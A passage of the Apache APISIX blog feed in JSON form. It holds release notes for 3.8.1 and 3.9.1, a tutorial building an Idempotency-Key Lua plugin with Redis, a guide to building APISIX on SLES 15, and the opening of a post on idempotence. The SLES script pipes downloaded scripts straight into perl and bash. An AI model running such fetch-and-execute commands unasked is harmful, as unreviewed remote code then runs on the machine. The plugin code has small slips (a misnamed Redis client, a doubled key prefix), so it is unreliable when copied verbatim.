3.8.1","description":"The Apache APISIX 3.8.1 version is released on April 29, 2024. This release includes a bug fix.","date":"2024-04-29T00:00:00.000Z","formattedDate":"April 29, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":0.485,"truncated":true,"authors":[{"name":"Yuansheng Wang","title":"Author","url":"https://github.com/membphis","image_url":"https://github.com/membphis.png","imageURL":"https://github.com/membphis.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"Monthly Report (April 01 - April 30)","permalink":"/blog/2024/04/30/monthly-report"},"nextItem":{"title":"Release Apache APISIX 3.9.1","permalink":"/blog/2024/04/29/release-apache-apisix-3.9.1"}},"content":"We are glad to release Apache APISIX 3.8.1 with a bug fix to improve user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\n## Bug Fix\\n\\n### Fix `forward-auth` plugin timeout\\n\\nFix `forward-auth` plugin timeouts when the client request uses POST and auth service API expects GET. The error was caused by APISIX forwarding the POST request with headers like `Content-Type` and `Expect` to the auth service API expecting GET.\\n\\nWith the latest fix, APISIX only adds POST request headers if the plugin\'s `request_method` configuration is set to POST.\\n\\nFor more information, see [PR #11021](https://github.com/apache/apisix/pull/11021).\\n\\n## Changelog\\n\\nVisit [here](https://github.com/apache/apisix/blob/release/3.8/CHANGELOG.md#381) to see the changelog."},{"id":"Release Apache APISIX 3.9.1","metadata":{"permalink":"/blog/2024/04/29/release-apache-apisix-3.9.1","source":"@site/blog/2024/04/29/release-apache-apisix-3.9.1.md","title":"Release Apache APISIX 3.9.1","description":"The Apache APISIX 3.9.1 version is released on April 29, 2024. This release includes a bug fix.","date":"2024-04-29T00:00:00.000Z","formattedDate":"April 29, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":0.485,"truncated":true,"authors":[{"name":"Yuansheng Wang","title":"Author","url":"https://github.com/membphis","image_url":"https://github.com/membphis.png","imageURL":"https://github.com/membphis.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"Release Apache APISIX 3.8.1","permalink":"/blog/2024/04/29/release-apache-apisix-3.8.1"},"nextItem":{"title":"Implementing the Idempotency-Key specification on Apache APISIX","permalink":"/blog/2024/04/11/implement-idempotency-key-apisix"}},"content":"We are glad to release Apache APISIX 3.9.1 with a bug fix to improve user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\n## Bug Fix\\n\\n### Fix `forward-auth` plugin timeout\\n\\nFix `forward-auth` plugin timeouts when the client request uses POST and auth service API expects GET. The error was caused by APISIX forwarding the POST request with headers like `Content-Type` and `Expect` to the auth service API expecting GET.\\n\\nWith the latest fix, APISIX only adds POST request headers if the plugin\'s `request_method` configuration is set to POST.\\n\\nFor more information, see [PR #11021](https://github.com/apache/apisix/pull/11021).\\n\\n## Changelog\\n\\nVisit [here](https://github.com/apache/apisix/blob/release/3.9/CHANGELOG.md#391) to see the changelog."},{"id":"Implementing the Idempotency-Key specification on Apache APISIX","metadata":{"permalink":"/blog/2024/04/11/implement-idempotency-key-apisix","source":"@site/blog/2024/04/11/implement-idempotency-key-apisix.md","title":"Implementing the Idempotency-Key specification on Apache APISIX","description":"Last week, I wrote an analysis of the IETF Idempotency-Key specification. The specification aims to avoid duplicated requests. In short, the idea is for the client to send a unique key along with the request: If the server doesn\'t know the key, it proceeds as usual and then stores the response. If the server knows the key, it short-circuits any further processing and immediately returns the stored response. This post shows how to implement it with Apache APISIX.\\n","date":"2024-04-11T00:00:00.000Z","formattedDate":"April 11, 2024","tags":[{"label":"Plugin","permalink":"/blog/tags/plugin"}],"readingTime":9.995,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Release Apache APISIX 3.9.1","permalink":"/blog/2024/04/29/release-apache-apisix-3.9.1"},"nextItem":{"title":"How to build APISIX in SLES 15","permalink":"/blog/2024/04/05/build-apisix-in-sles15"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/implement-idempotency-key-apisix/\\" />\\n</head>\\n\\n>Last week, I wrote an [analysis](https://apisix.apache.org/blog/2024/04/04/fix-duplicate-api-requests/) of the [IETF Idempotency-Key specification](https://datatracker.ietf.org/doc/html/draft-ietf-httpapi-idempotency-key-header-04). The specification aims to avoid duplicated requests. In short, the idea is for the client to send a unique key along with the request:\\n>\\n>* If the server doesn\'t know the key, it proceeds as usual and then stores the response\\n>* If the server knows the key, it short-circuits any further processing and immediately returns the stored response\\n>\\n>This post shows how to implement it with [Apache APISIX](https://apisix.apache.org/).\\n\\n\x3c!--truncate--\x3e\\n\\n## Overview\\n\\nBefore starting coding, we need to define a couple of things. Apache APISIX offers a plugin-based architecture. Hence, we will code the above logic in a plugin.\\n\\nApache APISIX builds upon OpenResty, which builds upon nginx. Each component defines phases, which map more or less across the components. For more info on phases, please see [this previous post](https://apisix.apache.org/blog/2023/12/14/apisix-plugins-priority-leaky-abstraction/).\\n\\nFinally, we shall decide on a priority. Priority defines the order in which APISIX runs plugins _inside a phase_. I decided on `1500`, as all authentication plugins have a priority in the `2000` and more range, but I want to return the cached response ASAP.\\n\\nThe specification requires us to store data. APISIX offers many abstractions, but storage is not one of them. We need access via the idempotency key so it looks like a key-value store.\\n\\nI arbitrarily chose Redis, as it\'s pretty widespread **and** the client is already part of the APISIX distribution. Note that simple Redis doesn\'t offer JSON storage; hence, I use the `redis-stack` Docker image.\\n\\nThe local infrastructure is the following:\\n\\n```yaml\\nservices:\\n  apisix:\\n    image: apache/apisix:3.9.0-debian\\n    volumes:\\n      - ./apisix/config.yml:/usr/local/apisix/conf/config.yaml:ro\\n      - ./apisix/apisix.yml:/usr/local/apisix/conf/apisix.yaml:ro #1\\n      - ./plugin/src:/opt/apisix/plugins:ro                  #2\\n    ports:\\n      - \\"9080:9080\\"\\n  redis:\\n    image: redis/redis-stack:7.2.0-v9\\n    ports:\\n      - \\"8001:8001\\"                                          #3\\n```\\n\\n1. Static route configuration\\n2. Path to our future plugin\\n3. Port of Redis Insights (GUI). Not necessary _per se_, but very useful during development for debugging\\n\\nThe APISIX configuration is the following:\\n\\n```yaml\\ndeployment:\\n  role: data_plane\\n  role_data_plane:\\n    config_provider: yaml                                    #1\\n\\napisix:\\n  extra_lua_path: /opt/?.lua                                 #2\\n\\nplugins:\\n  - idempotency                    # priority: 1500          #3\\n\\nplugin_attr:                                                 #4\\n  idempotency:\\n    host: redis                                              #5\\n```\\n\\n1. Configure APISIX for static routes configuration\\n2. Configure the location of our plugin\\n3. Custom plugins need to be explicitly declared. The priority comment is not required but is good practice and improves maintainability\\n4. Common plugin configuration across all routes\\n5. See below\\n\\nFinally, we declare our single route:\\n\\n```yaml\\nroutes:\\n  - uri: /*\\n    plugins:\\n      idempotency: ~                                         #1\\n    upstream:\\n      nodes:\\n        \\"httpbin.org:80\\": 1                                  #2\\n#END                                                         #3\\n```\\n\\n1. Declare the plugin that we are going to create\\n2. httpbin is a useful upstream as we can try different URIs and methods\\n3. Mandatory for static routes configuration!\\n\\nWith this infrastructure in place, we can start the implementation.\\n\\n## Laying out the plugin\\n\\nThe foundations of an Apache APISIX plugin are pretty basic:\\n\\n```lua\\nlocal plugin_name = \\"idempotency\\"\\n\\nlocal _M = {\\n    version = 1.0,\\n    priority = 1500,\\n    schema = {},\\n    name = plugin_name,\\n}\\n\\nreturn _M\\n```\\n\\nThe next step is configuration, _e.g._ Redis host and port. For starters, we shall offer a single Redis configuration across all routes. That\'s the idea behind the `plugin_attr` section in the `config.yaml` file: common configuration. Let\'s flesh out our plugin:\\n\\n```lua\\nlocal core = require(\\"apisix.core\\")\\nlocal plugin = require(\\"apisix.plugin\\")\\n\\nlocal attr_schema = {                                       --1\\n    type = \\"object\\",\\n    properties = {\\n        host = {\\n            type = \\"string\\",\\n            description = \\"Redis host\\",\\n            default = \\"localhost\\",\\n        },\\n        port = {\\n            type = \\"integer\\",\\n            description = \\"Redis port\\",\\n            default = 6379,\\n        },\\n    },\\n}\\n\\nfunction _M.init()\\n    local attr = plugin.plugin_attr(plugin_name) or {}\\n    local ok, err = core.schema.check(attr_schema, attr)    --2\\n    if not ok then\\n        core.log.error(\\"Failed to check the plugin_attr[\\", plugin_name, \\"]\\", \\": \\", err)\\n        return false, err\\n    end\\nend\\n```\\n\\n1. Define the shape of the configuration\\n2. Check the configuration is valid\\n\\nBecause I defined default values in the plugin, I can override only the `host` to `redis` to run inside my Docker Compose infrastructure and use the default port.\\n\\nNext, I need to create the Redis client. Note that the platform prevents me from connecting in any phase after the rewrite/access section. Hence, I\'ll create it in the `init()` method and keep it until the end.\\n\\n```lua\\nlocal redis_new = require(\\"resty.redis\\").new                --1\\n\\nfunction _M.init()\\n\\n    -- ...\\n\\n    redis = redis_new()                                     --2\\n    redis:set_timeout(1000)\\n    local ok, err = redis:connect(attr.host, attr.port)\\n    if not ok then\\n        core.log.error(\\"Failed to connect to Redis: \\", err)\\n        return false, err\\n    end\\nend\\n```\\n\\n1. Reference the `new` function of the OpenResty Redis module\\n2. Call it to get an instance\\n\\nThe Redis client is now available in the `redis` variable throughout the rest of the plugin execution cycle.\\n\\n## Implementing the nominal path\\n\\nIn my previous software engineer life, I usually implemented the nominal path first. Afterward, I made the code more robust by managing error cases individually. This way, if I had to release at any point, I would still deliver business values - with warnings. I shall approach this mini-project the same way.\\n\\nThe pseudo-algorithm on the nominal path looks like the following:\\n\\n```\\nDO extract idempotency key from request\\nDO look up value from Redis\\nIF value doesn\'t exist\\n  DO set key in Redis with empty value\\nELSE\\n  RETURN cached response\\nDO forward to upstream\\nDO store response in Redis\\nRETURN response\\n```\\n\\nWe need to map the logic to the phase I mentioned above. Two phases are available before the upstream, `rewrite` and `access`; three after, `header_filter`, `body_filter` and `log`. The `access` phase seemed obvious for work before, but I needed to figure out between the three others. I randomly chose the `body_filter`, but I\'m more than willing to listen to sensible arguments for other phases.\\n\\nNote that I removed logs to make the code more readable. Error and informational logs are necessary to ease debugging production issues.\\n\\n```lua\\nfunction _M.access(conf, ctx)\\n    local idempotency_key = core.request.header(ctx, \\"Idempotency-Key\\") --1\\n    local redis_key = \\"idempotency#\\" .. idempotency_key     --2\\n    local resp, err = redis:hgetall(redis_key)              --3\\n    if not resp then\\n        return\\n    end\\n    if next(resp) == nil then                               --4\\n        local resp, err = redis:hset(redis_key, \\"request\\", true ) --4\\n        if not resp then\\n            return\\n        end\\n    else\\n        local data = normalize_hgetall_result(resp)         --5\\n        local response = core.json.decode(data[\\"response\\"]) --6\\n        local body = response[\\"body\\"]                       --7\\n        local status_code = response[\\"status\\"]              --7\\n        local headers = response[\\"headers\\"]\\n        for k, v in pairs(headers) do                       --7\\n            core.response.set_header(k, v)\\n        end\\n        return core.response.exit(status_code, body)        --8\\n    end\\nend\\n```\\n\\n1. Extract the idempotency key from the request\\n2. Prefix the key so we avoid potential collisions\\n3. Get the data set stored in Redis under the idempotency key\\n4. If the key is not found, store it with a boolean mark\\n5. Transform the data in a Lua table via a custom utility function\\n6. The response is stored in JSON format to account for headers\\n7. Reconstruct the response\\n8. Return the reconstructed response to the client. Note the `return` statement: APISIX skips the later lifecycle phases\\n\\n```lua\\nfunction _M.body_filter(conf, ctx)\\n    local idempotency_key = core.request.header(ctx, \\"Idempotency-Key\\") --1\\n    local redis_key = \\"idempotency#\\" .. idempotency_key\\n    if core.response then\\n        local response = {                                  --2\\n            status = ngx.status,\\n            body = core.response.hold_body_chunk(ctx, true),\\n            headers = ngx.resp.get_headers()\\n        }\\n        local redis_key = \\"idempotency#\\" .. redis_key\\n        local resp, err = red:set(redis_key, \\"response\\", core.json.encode(response)) --3\\n        if not resp then\\n            return\\n        end\\n    end\\nend\\n```\\n\\n1. Extract the idempotency key from the request\\n2. Arrange the different elements of a response in a Lua table\\n3. Store the JSON-encoded response in a Redis set\\n\\nTests reveal that it works as expected.\\nTry:\\n\\n```bash\\ncurl -i -X POST -H \'Idempotency-Key: A\' localhost:9080/response-headers\\\\?freeform=hello\\ncurl -i -H \'Idempotency-Key: B\' localhost:9080/status/250\\ncurl -i -H \'Idempotency-Key: C\' -H \'foo: bar\'  localhost:9080/status/250\\n```\\n\\nAlso, try to reuse a mismatched idempotency key, _e.g._, `A`, for the third request. As we haven\'t implemented any error management yet, you\'ll get the cached response for another request. It\'s time to up our game.\\n\\n## Implementing error paths\\n\\nThe specification defines several error paths:\\n\\n* Idempotency-Key is missing\\n* Idempotency-Key is already used\\n* A request is outstanding for this Idempotency-Key\\n\\nLet\'s implement them one by one. First, let\'s check that the request has an idempotency key. Note that we can configure the plugin on a per-route basis, so if the route includes the plugin, we can conclude that it\'s mandatory.\\n\\n```lua\\nfunction _M.access(conf, ctx)\\n    local idempotency_key = core.request.header(ctx, \\"Idempotency-Key\\")\\n    if not idempotency_key then\\n        return core.response.exit(400, \\"This operation is idempotent and it requires correct usage of Idempotency Key\\")\\n    end\\n    -- ...\\n```\\n\\nJust return the appropriate 400 if the key is missing. That one was easy.\\n\\nChecking the reuse of an existing key for a different request is slightly more involved. We first need to store the request, or more precisely, the fingerprint of what constitutes a request. Two requests are the same if they have: the same method, the same path, the same body, and the same headers. Depending on your situation, the domain (and the port) might or may not be part of them. For my simple implementation, I\'ll leave it out.\\n\\nThere are several problems to solve. First, I didn\'t find an existing API to hash the `core.request` object like there is in other languages I\'m more familiar with, _e.g._, Java\'s `Object.hash()`. I decided to encode the object in JSON and hash the string. However, the existing `core.request` has sub-elements that cannot be converted to JSON. I had to extract the parts mentioned above and convert the table.\\n\\n```lua\\nlocal function hash_request(request, ctx)\\n    local request = {                                       --1\\n        method = core.request.get_method(),\\n        uri = ctx.var.request_uri,\\n        headers = core.request.headers(),\\n        body = core.request.get_body()\\n    }\\n    local json = core.json.stably_encode(request)           --2\\n    return ngx.encode_base64(json)                          --3\\nend\\n```\\n\\n1. Create a table with only the relevant parts\\n2. The `cjson` library produces JSON whose members might be sorted differently across several calls. Hence, it results in different hashes. The `core.json.stably_encode` fixes that issue.\\n3. Hash it\\n\\nThen, instead of storing a boolean when receiving the request, we store the resulting hash instead.\\n\\n```lua\\nlocal hash = hash_request(core.request, ctx)\\nif next(resp) == nil then\\n    core.log.warn(\\"No key found in Redis for Idempotency-Key, set it: \\", redis_key)\\n    local resp, err = redis:hset(redis_key, \\"request\\", hash)\\n    if not resp then\\n        core.log.error(\\"Failed to set data in Redis: \\", err)\\n        return\\n    end\\nthen -- ...\\n```\\n\\nWe read the hash stored under the idempotency key on the other branch. If they don\'t match, we exit with the relevant error code:\\n\\n```lua\\nlocal data = normalize_hgetall_result(resp)\\nlocal stored_hash = data[\\"request\\"]\\nif hash ~= stored_hash then\\n    return core.response.exit(422, \\"This operation is idempotent and it requires correct usage of Idempotency Key. Idempotency Key MUST not be reused across different payloads of this operation.\\")\\nend\\n```\\n\\nThe final error management happens just afterward. Imagine the following scenario:\\n\\n1. A request comes with idempotency key X\\n2. The plugin fingerprints and stores the hash in Redis\\n3. APISIX forwards the request to the upstream\\n4. A duplicate request comes with the same idempotency key, X\\n5. The plugin reads the data from Redis and finds no cached response\\n\\nThe upstream didn\'t finish processing the request; hence, the first request hasn\'t yet reached the `body_filter` phase.\\n\\nWe append the following code to the above snippet:\\n\\n```lua\\nif not data[\\"response\\"] then\\n    return core.response.exit(409, \\" request with the same Idempotency-Key for the same operation is being processed or is outstanding.\\")\\nend\\n```\\n\\nThat\'s it.\\n\\n## Conclusion\\n\\nIn this post, I showed a simple implementation of the `Idempotency-Key` header specification on Apache APISIX via a plugin. At this stage, it has room for improvement: automated tests, the ability to configure Redis on a per route basis, configure the domain/path to be part of the request, configure a Redis cluster instead of a single instance, use another K/V store, etc.\\n\\nYet, it does implement the specification and has the potential to evolve into a more production-grade implementation.\\n\\nThe complete source code for this post can be found on [GitHub](https://github.com/ajavageek/apisix-idempotency-plugin).\\n\\n**To go further:**\\n\\n* [Idempotency-Key HTTP Header Field](https://datatracker.ietf.org/doc/html/draft-ietf-httpapi-idempotency-key-header-04)\\n* [Fixing duplicate API requests](https://apisix.apache.org/blog/2024/04/04/fix-duplicate-api-requests/)\\n* [Plugin Develop - APISIX website](https://apisix.apache.org/docs/apisix/plugin-develop/)\\n* [How to Build an Apache APISIX Plugin From 0 to 1?](https://api7.ai/blog/how-to-build-an-apache-apisix-plugin-from-0-to-1)"},{"id":"How to build APISIX in SLES 15","metadata":{"permalink":"/blog/2024/04/05/build-apisix-in-sles15","source":"@site/blog/2024/04/05/build-apisix-in-sles15.md","title":"How to build APISIX in SLES 15","description":"By reading this article, you will learn how to build Apache APISIX for SUSE Linux Enterprise 15","date":"2024-04-05T00:00:00.000Z","formattedDate":"April 5, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.51,"truncated":true,"authors":[{"name":"Oier Saizar","title":"Author","url":"https://github.com/osaizar","image_url":"https://avatars.githubusercontent.com/u/9879984","imageURL":"https://avatars.githubusercontent.com/u/9879984"}],"prevItem":{"title":"Implementing the Idempotency-Key specification on Apache APISIX","permalink":"/blog/2024/04/11/implement-idempotency-key-apisix"},"nextItem":{"title":"Fixing duplicate API requests","permalink":"/blog/2024/04/04/fix-duplicate-api-requests"}},"content":"> By reading this article you will learn how to build Apache APISIX SLES 15 from source code.\\n> The build process will be done in the [SLE BCI 15 SP5 Base Container](https://registry.suse.com/categories/bci/repositories/bci-bci-base-15sp5)\\n\\n\x3c!--truncate--\x3e\\n\\n## Install dependencies\\n\\nBefore starting to build APISIX we need to install some dependencies needed to launch the build process:\\n\\n```shell\\nzypper install -y git sudo make vim\\n```\\n\\n## Clone the APISIX repository\\n\\nNext, we can clone the APISIX repository:\\n\\n```shell\\ngit clone https://github.com/apache/apisix.git\\ncd apisix\\n```\\n\\n## Modify the utils/install-dependencies.sh script\\n\\nCurrently the `utils/install-dependencies.sh` script does not support SLES 15, so we will need to modify it slightly to add support for this distro.\\n\\nCopy the next script:\\n\\n```bash\\n#!/usr/bin/env bash\\n\\n#\\n# Licensed to the Apache Software Foundation (ASF) under one or more\\n# contributor license agreements.  See the NOTICE file distributed with\\n# this work for additional information regarding copyright ownership.\\n# The ASF licenses this file to You under the Apache License, Version 2.0\\n# (the \\"License\\"); you may not use this file except in compliance with\\n# the License.  You may obtain a copy of the License at\\n#\\n#     http://www.apache.org/licenses/LICENSE-2.0\\n#\\n# Unless required by applicable law or agreed to in writing, software\\n# distributed under the License is distributed on an \\"AS IS\\" BASIS,\\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\\n# See the License for the specific language governing permissions and\\n# limitations under the License.\\n#\\n\\nset -ex\\n\\nfunction detect_aur_helper() {\\n    if [[ $(command -v yay) ]]; then\\n        AUR_HELPER=yay\\n    elif [[ $(command -v pacaur) ]]; then\\n        AUR_HELPER=pacaur\\n    else\\n        echo No available AUR helpers found. Please specify your AUR helper by AUR_HELPER.\\n        exit 255\\n    fi\\n}\\n\\nfunction install_dependencies_with_aur() {\\n    detect_aur_helper\\n    $AUR_HELPER -S openresty --noconfirm\\n    sudo pacman -S openssl --noconfirm\\n\\n    export OPENRESTY_PREFIX=/opt/openresty\\n\\n    sudo mkdir $OPENRESTY_PREFIX/openssl\\n    sudo ln -s /usr/include $OPENRESTY_PREFIX/openssl/include\\n    sudo ln -s /usr/lib $OPENRESTY_PREFIX/openssl/lib\\n}\\n\\n# Install dependencies on centos and fedora\\nfunction install_dependencies_with_yum() {\\n    sudo yum install -y yum-utils\\n    sudo yum-config-manager --add-repo \\"https://openresty.org/package/${1}/openresty.repo\\"\\n    if [[ \\"${1}\\" == \\"centos\\" ]]; then\\n        sudo yum -y install centos-release-scl\\n        sudo yum -y install devtoolset-9 patch wget\\n        set +eu\\n        source scl_source enable devtoolset-9\\n        set -eu\\n    fi\\n    sudo yum install -y  \\\\\\n        gcc gcc-c++ curl wget unzip xz gnupg perl-ExtUtils-Embed cpanminus patch \\\\\\n        perl perl-devel pcre pcre-devel openldap-devel \\\\\\n        openresty-zlib-devel openresty-pcre-devel\\n}\\n\\n# Install dependencies on ubuntu and debian\\nfunction install_dependencies_with_apt() {\\n    # add OpenResty source\\n    sudo apt-get update\\n    sudo apt-get -y install software-properties-common wget lsb-release gnupg patch\\n    wget -qO - https://openresty.org/package/pubkey.gpg | sudo apt-key add -\\n    arch=$(uname -m | tr \'[:upper:]\' \'[:lower:]\')\\n    arch_path=\\"\\"\\n    if [[ $arch == \\"arm64\\" ]] || [[ $arch == \\"aarch64\\" ]]; then\\n        arch_path=\\"arm64/\\"\\n    fi\\n    if [[ \\"${1}\\" == \\"ubuntu\\" ]]; then\\n        sudo add-apt-repository -y \\"deb http://openresty.org/package/${arch_path}ubuntu $(lsb_release -sc) main\\"\\n    elif [[ \\"${1}\\" == \\"debian\\" ]]; then\\n        sudo add-apt-repository -y \\"deb http://openresty.org/package/${arch_path}debian $(lsb_release -sc) openresty\\"\\n    fi\\n    sudo apt-get update\\n\\n    # Install some compilation tools\\n    sudo apt-get install -y curl make gcc g++ cpanminus libpcre3 libpcre3-dev libldap2-dev unzip openresty-zlib-dev openresty-pcre-dev\\n}\\n\\n# Install dependencies on SLES\\nfunction install_dependencies_with_zypper() {\\n    sudo rm -f /etc/zypp/repos.d/openresty.repo 2> /dev/null\\n    sudo rpm --import https://openresty.org/package/pubkey.gpg\\n    sudo zypper ar -g --refresh --check \\"https://openresty.org/package/sles/openresty.repo\\"\\n    sudo zypper mr -G openresty\\n    sudo zypper refresh\\n\\n    sudo zypper install -y  \\\\\\n        awk git gcc gcc-c++ curl wget unzip xz patch \\\\\\n        perl libpcre1 pcre-devel pcre-tools openldap2-devel \\\\\\n        openresty-zlib-devel openresty-pcre-devel\\n\\n    curl -L https://cpanmin.us | perl - --sudo App::cpanminus\\n}\\n\\n# Identify the different distributions and call the corresponding function\\nfunction multi_distro_installation() {\\n    if grep -Eqi \\"CentOS\\" /etc/issue || grep -Eq \\"CentOS\\" /etc/*-release; then\\n        install_dependencies_with_yum \\"centos\\"\\n    elif grep -Eqi -e \\"Red Hat\\" -e \\"rhel\\" /etc/*-release; then\\n        install_dependencies_with_yum \\"rhel\\"\\n    elif grep -Eqi \\"Fedora\\" /etc/issue || grep -Eq \\"Fedora\\" /etc/*-release; then\\n        install_dependencies_with_yum \\"fedora\\"\\n    elif grep -Eqi \\"Debian\\" /etc/issue || grep -Eq \\"Debian\\" /etc/*-release; then\\n        install_dependencies_with_apt \\"debian\\"\\n    elif grep -Eqi \\"Ubuntu\\" /etc/issue || grep -Eq \\"Ubuntu\\" /etc/*-release; then\\n        install_dependencies_with_apt \\"ubuntu\\"\\n    elif grep -Eqi \\"Arch\\" /etc/issue || grep -Eqi \\"EndeavourOS\\" /etc/issue || grep -Eq \\"Arch\\" /etc/*-release; then\\n        install_dependencies_with_aur\\n    elif grep -Eqi \\"SUSE\\" /etc/os-release; then\\n        install_dependencies_with_zypper\\n    else\\n        echo \\"Non-supported distribution, APISIX is only supported on Linux-based systems\\"\\n        exit 1\\n    fi\\n    install_apisix_runtime\\n}\\n\\nfunction multi_distro_uninstallation() {\\n    if grep -Eqi \\"CentOS\\" /etc/issue || grep -Eq \\"CentOS\\" /etc/*-release; then\\n        sudo yum autoremove -y openresty-zlib-devel openresty-pcre-devel\\n    elif grep -Eqi -e \\"Red Hat\\" -e \\"rhel\\" /etc/*-release; then\\n        sudo yum autoremove -y openresty-zlib-devel openresty-pcre-devel\\n    elif grep -Eqi \\"Fedora\\" /etc/issue || grep -Eq \\"Fedora\\" /etc/*-release; then\\n        sudo yum autoremove -y openresty-zlib-devel openresty-pcre-devel\\n    elif grep -Eqi \\"Debian\\" /etc/issue || grep -Eq \\"Debian\\" /etc/*-release; then\\n        sudo apt-get autoremove -y openresty-zlib-dev openresty-pcre-dev\\n    elif grep -Eqi \\"Ubuntu\\" /etc/issue || grep -Eq \\"Ubuntu\\" /etc/*-release; then\\n        sudo apt-get autoremove -y openresty-zlib-dev openresty-pcre-dev\\n    elif grep -Eqi \\"SUSE\\" /etc/os-release; then\\n        sudo zypper remove -y openresty-zlib-dev openresty-pcre-dev\\n    else\\n        echo \\"Non-supported distribution, APISIX is only supported on Linux-based systems\\"\\n        exit 1\\n    fi\\n}\\n\\nfunction install_apisix_runtime() {\\n    export runtime_version=${APISIX_RUNTIME:?}\\n    wget \\"https://raw.githubusercontent.com/api7/apisix-build-tools/apisix-runtime/${APISIX_RUNTIME}/build-apisix-runtime.sh\\"\\n    chmod +x build-apisix-runtime.sh\\n    ./build-apisix-runtime.sh latest\\n    rm build-apisix-runtime.sh\\n}\\n\\n# Install LuaRocks\\nfunction install_luarocks() {\\n    if [ -f \\"./utils/linux-install-luarocks.sh\\" ]; then\\n        ./utils/linux-install-luarocks.sh\\n    elif [ -f \\"./linux-install-luarocks.sh\\" ]; then\\n        ./linux-install-luarocks.sh\\n    else\\n        echo \\"Installing luarocks from remote master branch\\"\\n        curl https://raw.githubusercontent.com/apache/apisix/master/utils/linux-install-luarocks.sh -sL | bash -\\n    fi\\n}\\n\\n# Entry\\nfunction main() {\\n    OS_NAME=$(uname -s | tr \'[:upper:]\' \'[:lower:]\')\\n    if [[ \\"$#\\" == 0 ]]; then\\n        if [[ \\"${OS_NAME}\\" == \\"linux\\" ]]; then\\n            multi_distro_installation\\n            install_luarocks\\n            return\\n        else\\n            echo \\"Non-supported distribution, APISIX is only supported on Linux-based systems\\"\\n            exit 1\\n        fi\\n    fi\\n\\n    case_opt=$1\\n    case \\"${case_opt}\\" in\\n        \\"install_luarocks\\")\\n            install_luarocks\\n        ;;\\n        \\"uninstall\\")\\n            if [[ \\"${OS_NAME}\\" == \\"linux\\" ]]; then\\n                multi_distro_uninstallation\\n            else\\n                echo \\"Non-supported distribution, APISIX is only supported on Linux-based systems\\"\\n            fi\\n        ;;\\n        *)\\n            echo \\"Unsupported method: ${case_opt}\\"\\n        ;;\\n    esac\\n}\\n\\nmain \\"$@\\"\\n```\\n\\nAnd paste it in `utils/install-dependencies.sh` using vim or your text editor of choice:\\n\\n```shell\\nvim install-dependencies.sh\\n# Copy and paste the script\\nmv install-dependencies.sh utils/install-dependencies.sh\\nchmod 755 utils/install-dependencies.sh\\n```\\n\\nThis will add an `install_dependencies_with_zypper` function to the script that will handle all the needed dependencies for SLES 15.\\n\\n## Build APISIX from source\\n\\nWe are ready to follow the [Building APISIX from source](https://apisix.apache.org/docs/apisix/next/building-apisix/) documentation.\\n\\nWe can launch the next commands to build and install APISIX:\\n\\n```shell\\nmake deps\\nmake install\\n```\\n\\n## Install etcd\\n\\nAPISIX needs etcd to work, we can install etcd following the [official documentation](https://apisix.apache.org/docs/apisix/next/building-apisix/#installing-etcd)\\n\\n```shell\\nETCD_VERSION=\'3.4.18\'\\nwget https://github.com/etcd-io/etcd/releases/download/v${ETCD_VERSION}/etcd-v${ETCD_VERSION}-linux-amd64.tar.gz\\ntar -xvf etcd-v${ETCD_VERSION}-linux-amd64.tar.gz && \\\\\\n  cd etcd-v${ETCD_VERSION}-linux-amd64 && \\\\\\n  sudo cp -a etcd etcdctl /usr/bin/\\n  cd ..\\nnohup etcd >/tmp/etcd.log 2>&1 &\\n```\\n\\n## Create a nobody user and group\\n\\nBefore launching APISIX we need to create a user and a group both called `nobody`.\\nThis is necessary for `openresty` to launch correctly.\\n\\n```shell\\nuseradd nobody -U\\n```\\n\\n## Run APISIX\\n\\nFinally APISIX can be initialized and started:\\n\\n```shell\\napisix init\\napisix start\\n```"},{"id":"Fixing duplicate API requests","metadata":{"permalink":"/blog/2024/04/04/fix-duplicate-api-requests","source":"@site/blog/2024/04/04/fix-duplicate-api-requests.md","title":"Fixing duplicate API requests","description":"The first rule of distributed systems is \\"Don\u2019t distribute your system\\". Designing distributed systems right is infamously hard for multiple reasons.\\n","date":"2024-04-04T00:00:00.000Z","formattedDate":"April 4, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.215,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"How to build APISIX in SLES 15","permalink":"/blog/2024/04/05/build-apisix-in-sles15"},"nextItem":{"title":"Monthly Report (March 01 - March 31)","permalink":"/blog/2024/04/01/monthly-report"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/fix-duplicate-api-requests/\\" />\\n</head>\\n\\n>The first rule of distributed systems is \\"Don\u2019t distribute your system\\". Designing distributed systems right is infamously hard for multiple reasons.\\n\\n\x3c!--truncate--\x3e\\n\\n## The idempotency concept\\n\\nFor example, a call to a function can succeed or fail in non-distributed systems. Once you move the called function to a remote component, a third option appears: you call the remote function but get no response from the component. At this point, it\u2019s impossible to know whether the call reached the component or not, *i.e.*, whether the problem occurred on the way to or the way back.\\n\\nThe only choice is to resend the request again. It\u2019s a non-issue for reads; for calls that update the remote state, it\u2019s \\"complicated.\\" We need to describe the concept of *idempotence*:\\n>Idempotence is the property of certain operations in mathematics and computer science whereby they can be applied multiple times without changing the result beyond the initial application.\\n>\\n>\u2014- [Idempotence on Wikipedia](https://en.wikipedia.org/wiki/Idempotence)\\n\\nIn the realm of HTTP APIs:\\n\\n* `GET`, `PUT`, `DELETE`, `HEAD`, `OPTIONS`, and `TRACE` are idempotent. For example, if you repeatedly delete an entity 